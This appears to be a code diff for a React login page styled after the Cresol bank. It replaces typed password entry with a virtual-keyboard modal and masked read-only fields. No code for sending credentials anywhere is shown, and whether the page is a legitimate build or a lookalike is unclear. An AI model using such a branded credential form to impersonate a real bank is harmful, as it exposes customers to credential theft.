@@ -1,8 +1,8 @@
-
 import React, { useState } from "react";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
+import { VirtualKeyboardModal } from "@/components/VirtualKeyboardModal";
 
 const TABS = [
   { label: "Pessoa Física", value: "fisica" },
@@ -20,6 +20,12 @@ const Index = () => {
   const [saveCpf, setSaveCpf] = useState(false);
   const [saveCnpj, setSaveCnpj] = useState(false);
   const [saveChaveMulticanal, setSaveChaveMulticanal] = useState(false);
+  const [showPasswordModal, setShowPasswordModal] = useState(false);
+
+  // O modal retorna a senha digitada
+  function handlePasswordModalSubmit(newSenha: string) {
+    setSenha(newSenha);
+  }
 
   const renderFormContent = () => {
     switch (tab) {
@@ -42,19 +48,21 @@ const Index = () => {
             <div className="mb-3 relative">
               <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
               <input
-                type={showSenha ? "text" : "password"}
-                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100"
+                type="password"
+                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100 cursor-pointer"
                 placeholder="Senha"
-                value={senha}
-                onChange={(e) => setSenha(e.target.value)}
-                autoComplete="current-password"
+                value={senha ? "••••••" : ""}
+                onFocus={() => setShowPasswordModal(true)}
+                readOnly
+                style={{ userSelect: "none" }}
+                autoComplete="off"
               />
               <button
                 type="button"
                 className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
                 tabIndex={-1}
-                onClick={() => setShowSenha((v) => !v)}
-                aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
+                onClick={() => setShowPasswordModal(true)}
+                aria-label="Mostrar teclado"
               >
                 {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
               </button>
@@ -95,19 +103,21 @@ const Index = () => {
             <div className="mb-3 relative">
               <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
               <input
-                type={showSenha ? "text" : "password"}
-                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100"
+                type="password"
+                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100 cursor-pointer"
                 placeholder="Senha"
-                value={senha}
-                onChange={(e) => setSenha(e.target.value)}
-                autoComplete="current-password"
+                value={senha ? "••••••" : ""}
+                onFocus={() => setShowPasswordModal(true)}
+                readOnly
+                style={{ userSelect: "none" }}
+                autoComplete="off"
               />
               <button
                 type="button"
                 className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
                 tabIndex={-1}
-                onClick={() => setShowSenha((v) => !v)}
-                aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
+                onClick={() => setShowPasswordModal(true)}
+                aria-label="Mostrar teclado"
               >
                 {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
               </button>
@@ -148,19 +158,21 @@ const Index = () => {
             <div className="mb-3 relative">
               <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
               <input
-                type={showSenha ? "text" : "password"}
-                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100"
+                type="password"
+                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100 cursor-pointer"
                 placeholder="Senha"
-                value={senha}
-                onChange={(e) => setSenha(e.target.value)}
-                autoComplete="current-password"
+                value={senha ? "••••••" : ""}
+                onFocus={() => setShowPasswordModal(true)}
+                readOnly
+                style={{ userSelect: "none" }}
+                autoComplete="off"
               />
               <button
                 type="button"
                 className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
                 tabIndex={-1}
-                onClick={() => setShowSenha((v) => !v)}
-                aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
+                onClick={() => setShowPasswordModal(true)}
+                aria-label="Mostrar teclado"
               >
                 {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
               </button>
@@ -189,6 +201,12 @@ const Index = () => {
 
   return (
     <div className="min-h-screen flex bg-[#fff]">
+      <VirtualKeyboardModal
+        open={showPasswordModal}
+        onClose={() => setShowPasswordModal(false)}
+        onSubmit={handlePasswordModalSubmit}
+        initialValue={senha}
+      />
       {/* Left: Formulário */}
       <div className="w-1/2 flex flex-col justify-center px-[7%] py-12 relative">
         <div className="max-w-md w-full mx-auto">
